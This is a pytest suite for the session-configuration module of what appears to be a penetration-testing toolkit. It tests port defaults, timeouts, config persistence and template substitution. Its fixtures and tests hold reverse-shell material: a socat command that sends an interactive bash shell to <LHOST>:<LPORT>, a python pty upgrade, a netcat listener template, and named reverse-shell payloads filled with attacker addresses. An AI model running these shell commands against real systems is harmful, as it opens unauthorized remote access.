"""
Tests for session configuration management

Tests:
- SessionConfig: Loading config, defaults, variable substitution
- Config updates and persistence
- Template rendering
"""

import json
import tempfile
from pathlib import Path
import pytest

from crack.sessions.config import SessionConfig


class TestSessionConfig:
    """Test SessionConfig class"""

    @pytest.fixture
    def temp_config_file(self):
        """Create temporary config file"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            config_path = Path(f.name)

        yield config_path

        # Cleanup
        if config_path.exists():
            config_path.unlink()

    @pytest.fixture
    def config(self, temp_config_file):
        """Create SessionConfig instance"""
        return SessionConfig(config_path=temp_config_file)

    @pytest.fixture
    def config_with_data(self, temp_config_file):
        """Create config file with test data"""
        config_data = {
            'sessions': {
                'default_ports': {
                    'tcp': 4444,
                    'http': 8080
                },
                'shell_upgrade_payloads': {
                    'python_pty': 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
                },
                'listener_templates': {
                    'netcat': 'nc -nlvp <PORT>'
                }
            },
            'variables': {
                'LHOST': {'value': '192.168.1.100'},
                'LPORT': {'value': '4444'}
            }
        }

        with open(temp_config_file, 'w') as f:
            json.dump(config_data, f)

        return SessionConfig(config_path=temp_config_file)

    def test_init_creates_config_file(self, temp_config_file):
        """Test initialization creates config file if missing"""
        config = SessionConfig(config_path=temp_config_file)

        assert temp_config_file.exists()

    def test_loads_default_config(self, config):
        """Test default configuration is loaded"""
        assert config.get_default_port('tcp') == 4444
        assert config.get_default_port('http') == 8080
        assert config.get_default_port('https') == 443

    def test_get_default_port(self, config):
        """Test getting default port by protocol"""
        assert config.get_default_port('tcp') == 4444
        assert config.get_default_port('http') == 8080
        assert config.get_default_port('icmp') is None

    def test_get_default_port_case_insensitive(self, config):
        """Test protocol is case-insensitive"""
        assert config.get_default_port('TCP') == 4444
        assert config.get_default_port('Http') == 8080

    def test_get_upgrade_payload(self, config):
        """Test getting upgrade payload"""
        payload = config.get_upgrade_payload('python_pty')

        assert payload is not None
        assert 'python3' in payload
        assert 'pty.spawn' in payload

    def test_get_upgrade_payload_not_found(self, config):
        """Test getting non-existent upgrade payload"""
        payload = config.get_upgrade_payload('nonexistent')

        assert payload is None

    def test_get_upgrade_payload_with_substitution(self, config_with_data):
        """Test upgrade payload with variable substitution"""
        # Add socat payload that uses variables
        config_with_data._config['shell_upgrade_payloads']['socat'] = \
            'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>'

        payload = config_with_data.get_upgrade_payload(
            'socat',
            LHOST='192.168.45.100',
            LPORT='5555'
        )

        assert '192.168.45.100' in payload
        assert '5555' in payload
        assert '<LHOST>' not in payload
        assert '<LPORT>' not in payload

    def test_get_listener_template(self, config):
        """Test getting listener template"""
        template = config.get_listener_template('netcat', PORT=4444)

        assert template is not None
        assert '4444' in template
        assert '<PORT>' not in template

    def test_get_listener_template_not_found(self, config):
        """Test getting non-existent listener template"""
        template = config.get_listener_template('nonexistent')

        assert template is None

    def test_get_listener_template_multiple_vars(self, config):
        """Test listener template with multiple variables"""
        template = config.get_listener_template(
            'metasploit',
            PORT=4444,
            LHOST='192.168.1.100',
            PAYLOAD='linux/x64/shell_reverse_tcp'
        )

        assert template is not None
        assert '4444' in template
        assert '192.168.1.100' in template
        assert 'linux/x64/shell_reverse_tcp' in template

    def test_get_reverse_shell_payload(self, config):
        """Test getting reverse shell payload"""
        payload = config.get_reverse_shell_payload(
            'bash_tcp',
            LHOST='192.168.45.100',
            LPORT='4444'
        )

        assert payload is not None
        assert '192.168.45.100' in payload
        assert '4444' in payload

    def test_get_reverse_shell_payload_python(self, config):
        """Test Python reverse shell payload"""
        payload = config.get_reverse_shell_payload(
            'python_socket',
            LHOST='10.10.10.10',
            LPORT='9001'
        )

        assert '10.10.10.10' in payload
        assert '9001' in payload
        assert 'socket' in payload

    def test_substitute_variables_from_global_config(self, config_with_data):
        """Test variable substitution from global config"""
        # Template with global variables
        template = 'nc <LHOST> <LPORT>'

        result = config_with_data._substitute_variables(template, {})

        # Should substitute from global config
        assert '192.168.1.100' in result or '<LHOST>' in result
        assert '4444' in result or '<LPORT>' in result

    def test_get_timeout(self, config):
        """Test getting timeout values"""
        assert config.get_timeout('connection') == 30
        assert config.get_timeout('upgrade') == 60
        assert config.get_timeout('command') == 10

    def test_get_timeout_unknown(self, config):
        """Test getting unknown timeout returns default"""
        timeout = config.get_timeout('unknown')

        assert timeout == 30  # Default

    def test_is_auto_upgrade_enabled(self, config):
        """Test auto upgrade setting"""
        assert config.is_auto_upgrade_enabled() is True

    def test_is_auto_stabilize_enabled(self, config):
        """Test auto stabilize setting"""
        assert config.is_auto_stabilize_enabled() is True

    def test_get_storage_path(self, config):
        """Test getting storage path"""
        path = config.get_storage_path()

        assert isinstance(path, Path)
        assert 'sessions' in str(path)

    def test_update_config(self, config_with_data):
        """Test updating configuration"""
        updates = {
            'auto_upgrade': False,
            'timeouts': {
                'connection': 60
            }
        }

        result = config_with_data.update_config(updates)

        assert result is True
        assert config_with_data.is_auto_upgrade_enabled() is False
        assert config_with_data.get_timeout('connection') == 60

    def test_update_config_persists(self, temp_config_file):
        """Test config updates persist to disk"""
        config1 = SessionConfig(config_path=temp_config_file)

        config1.update_config({'auto_upgrade': False})

        # Create new instance - should load persisted config
        config2 = SessionConfig(config_path=temp_config_file)

        assert config2.is_auto_upgrade_enabled() is False

    def test_list_upgrade_methods(self, config):
        """Test listing upgrade methods"""
        methods = config.list_upgrade_methods()

        assert 'python_pty' in methods
        assert 'script' in methods
        assert 'socat' in methods

    def test_list_listener_types(self, config):
        """Test listing listener types"""
        types = config.list_listener_types()

        assert 'netcat' in types
        assert 'socat' in types
        assert 'metasploit' in types

    def test_list_reverse_shell_types(self, config):
        """Test listing reverse shell types"""
        types = config.list_reverse_shell_types()

        assert 'bash_tcp' in types
        assert 'python_socket' in types
        assert 'nc_mkfifo' in types

    def test_get_config_dict(self, config):
        """Test getting full config as dictionary"""
        config_dict = config.get_config_dict()

        assert isinstance(config_dict, dict)
        assert 'default_ports' in config_dict
        assert 'shell_upgrade_payloads' in config_dict
        assert 'timeouts' in config_dict

    def test_reset_to_defaults(self, config_with_data):
        """Test resetting config to defaults"""
        # Modify config
        config_with_data.update_config({'auto_upgrade': False})

        # Reset
        result = config_with_data.reset_to_defaults()

        assert result is True
        assert config_with_data.is_auto_upgrade_enabled() is True

    def test_merge_configs(self, config):
        """Test merging user config with defaults"""
        defaults = {
            'key1': 'default1',
            'key2': {
                'nested1': 'default_nested',
                'nested2': 'default_nested2'
            }
        }

        user = {
            'key2': {
                'nested1': 'user_nested'
            },
            'key3': 'user3'
        }

        result = config._merge_configs(defaults, user)

        # User overrides nested value
        assert result['key2']['nested1'] == 'user_nested'
        # Default nested value preserved
        assert result['key2']['nested2'] == 'default_nested2'
        # User adds new key
        assert result['key3'] == 'user3'
        # Default key preserved
        assert result['key1'] == 'default1'

    def test_get_stabilization_command(self, config):
        """Test getting stabilization command"""
        cmd = config.get_stabilization_command('export_term')

        assert cmd is not None
        assert 'TERM=xterm' in cmd

    def test_get_stabilization_command_with_vars(self, config):
        """Test stabilization command with variables"""
        cmd = config.get_stabilization_command('stty_size', ROWS=24, COLS=80)

        assert cmd is not None
        assert '24' in cmd
        assert '80' in cmd

    def test_config_preserves_existing_sections(self, temp_config_file):
        """Test creating config preserves existing sections"""
        # Create config with existing data
        existing_config = {
            'settings': {
                'some_setting': True
            },
            'variables': {
                'CUSTOM_VAR': 'value'
            }
        }

        with open(temp_config_file, 'w') as f:
            json.dump(existing_config, f)

        # Initialize SessionConfig (should add sessions section)
        config = SessionConfig(config_path=temp_config_file)

        # Load full config
        with open(temp_config_file, 'r') as f:
            full_config = json.load(f)

        # Check existing sections preserved
        assert 'settings' in full_config
        assert full_config['settings']['some_setting'] is True
        assert 'variables' in full_config
        assert full_config['variables']['CUSTOM_VAR'] == 'value'
        # And sessions section added
        assert 'sessions' in full_config
